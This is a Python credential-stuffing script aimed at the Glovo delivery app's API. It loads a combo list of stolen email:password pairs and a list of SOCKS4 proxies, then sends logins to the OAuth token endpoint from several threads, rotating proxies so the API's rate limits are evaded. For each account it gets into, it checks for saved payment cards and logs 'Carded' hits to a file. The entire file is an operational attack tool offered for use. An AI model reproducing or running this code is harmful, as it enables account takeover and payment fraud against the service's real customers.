import requests , time  , sys , threading , random , re

if sys.platform in ["linux","linux2"]:
	W = '\033[0m'
	G = '\033[32;1m'
	R = '\033[31;1m'
	
else:
	W = ''
	G = ''
	R = ''




pattern = re.compile(r'{"token":"(\S+)"}')


# x = 1


def cards(user,passw,num,token):

	hd = {

	'Host': 'api.glovoapp.com',
	'Connection': 'close',
	'Glovo-API-Version': '8',
	'Glovo-App-Version': '6',
	'Glovo-Delivery-Location-Longitude': '31.32270900000003',
	'Glovo-App-Platform': 'web',
	'Glovo-Language-Code': 'en',
	'Content-Type': 'application/json',
	'Accept': 'application/json',
	'Authorization': '%s' % (token),
	'Glovo-Delivery-Location-Accuracy': '0',
	'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
	'Glovo-Delivery-Location-Latitude': '30.09098369999999',
	'Glovo-Delivery-Location-Timestamp': '1540133095093',
	'Origin': 'https://glovoapp.com',
	'Referer': 'https://glovoapp.com/en/hel',
	'Accept-Encoding': 'gzip, deflate',
	'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
	}

	res = requests.get('https://api.glovoapp.com/v3/cards' , headers=hd)

	if '"expirationMonth":' in res.text:
		print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
		print(G +'[+ Live +]' , end='')
		print(G +' [ + With Card + ]')
		with open('glov-Valid.txt' , 'a') as file:

			file.write(user + ':' + passw + ' [ + Carded + ]' +'\n')
	else:
		print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
		print(G +'[+ Live +]',end='')
		print(R + ' [ + Without Card + ]')
		with open('glov-Valid.txt' , 'a') as file:

			file.write(user + ':' + passw + ' [ + Not Carded + ]' +'\n')



def req(user , passw, num):
	# global 

	# if x == len(listaprx):
		# x = 1
	# y = listaprx[x]
	x = 0
	while True:
		x += 1
		if x == 7:
			print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
			print(R + '[ + Error + ]')
			break
		
		try:


			hd = {
				

				'Host': 'api.glovoapp.com',
				'Connection': 'close',
				'Content-Length': '77',
				'Glovo-API-Version': '8',
				'Glovo-App-Version': '6',
				'Glovo-Delivery-Location-Longitude': '31.32270900000003',
				'Glovo-App-Platform': 'web',
				'Glovo-Language-Code': 'en',
				'Content-Type': 'application/json',
				'Accept': 'application/json',
				'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.67 Safari/537.36',
				'Glovo-Delivery-Location-Accuracy': '0',
				'Glovo-Delivery-Location-Latitude': '30.09098369999999',
				'Glovo-Delivery-Location-Timestamp': '1540055555407',
				'Origin': 'https://glovoapp.com',
				'Referer': 'https://glovoapp.com/en/hel',
				'Accept-Encoding': 'gzip, deflate',
				'Accept-Language': 'en-US,en;q=0.9,ar;q=0.8'
			}
			payload = '{"grantType":"password","email":"%s","password":"%s"}' % (user , passw)

			session = requests.session()
			session.proxies ={'https':'socks4://%s' % (random.sample(listaprx,1)[0])}
			res = session.post('https://api.glovoapp.com/v3/oauth/token', headers=hd , data=payload , timeout=10)
			# res.raise_for_status()
			# x += 1

			if '{"token":' in res.text:
				
				
				search = pattern.search(res.text)
				token = search.group(1)
				
				# print(G + '[ + Live + ]', end='' , flush=True)

				cards(user,passw,num,token)


			elif '"message":"Authentication failed: bad credentials"' in res.text:
				print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
				print(R + '[ + Die + ]')

			elif '"message":"You\'ve reached an API limit"' in res.text :
				# print('limit')


				# time.sleep(10)
				raise
			else:
				print(W + '[%s/%s] checking  : ' % (num,totalnum) ,'[', user ,']',':', '[',passw ,']', end=' ... ')
				print('error' ,res.text)

		except Exception as exx:
			# print(exx)
			# time.sleep(10)
			continue
		break




print(G + r'''
 ___ ___  ____         ____   ___    ___   ______ 
|   |   ||    \       |    \ /   \  /   \ |      |
| _   _ ||  D  )_____ |  D  )     ||     ||      |
|  \_/  ||    /|     ||    /|  O  ||  O  ||_|  |_|
|   |   ||    \|_____||    \|     ||     |  |  |  
|   |   ||  .  \      |  .  \     ||     |  |  |  
|___|___||__|\_|      |__|\_|\___/  \___/   |__|  
                                                  
''')
print('  [ FB ]   : https://www.facebook.com/bassem.beso.18659')
print('[ GitHub ] : https://github.com/beneameenth')
print()
print(R + '[X] Proxies List   : ' , end='')

filep = input()

with open(filep) as fileprx:

	listaprx = fileprx.read().split('\n')
	random.shuffle(listaprx)


print(R + '[X] Combo   List   : ' , end='')
 
txt = input()


with open(txt) as file:


	lista = file.read().split('\n')


totalnum = len(lista)

print('[X] Threads Number : ' , end='')

threadnum = int(input())


threads = []

for i in lista:


	

	try:
		user , passw = i.split(':')
	except:
		continue 


	num = lista.index(i) + 1

	thread = threading.Thread(target=req , args=(user.strip() , passw.strip() , num))
	threads.append(thread)
	thread.start()

	if len(threads) == threadnum:
		for i in threads:
			i.join()
		threads = []


# print(res.headers)